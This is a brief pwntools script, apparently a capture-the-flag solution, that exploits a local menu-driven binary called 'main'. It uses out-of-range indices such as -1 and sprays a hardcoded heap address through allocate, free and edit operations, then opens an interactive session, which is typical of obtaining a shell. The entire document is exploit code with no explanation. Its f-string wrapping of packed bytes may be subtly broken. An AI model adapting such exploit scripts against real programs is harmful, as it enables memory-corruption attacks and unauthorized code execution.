from pwn import *
exe = context.binary = ELF("./main")
r = process()
r.sendline("4")
def send_one():
    for i in range(-1,7):
        log.info(f"Send to : {i}")
        r.sendline("1")
        r.sendline(f"{i}")
        r.sendline(f"{p64(0x55555556d800) * 10}")

send_one()

sleep(15)
for i in range(0,7):
    r.sendline("3")
    r.sendline(f"{i}")

r.sendline("1")
r.sendline("3")
r.sendline(f"{p64(0x55555556d800) * 16}")

for i in range(0,7):
    r.sendline("2")
    r.sendline(f"{i}")
r.interactive()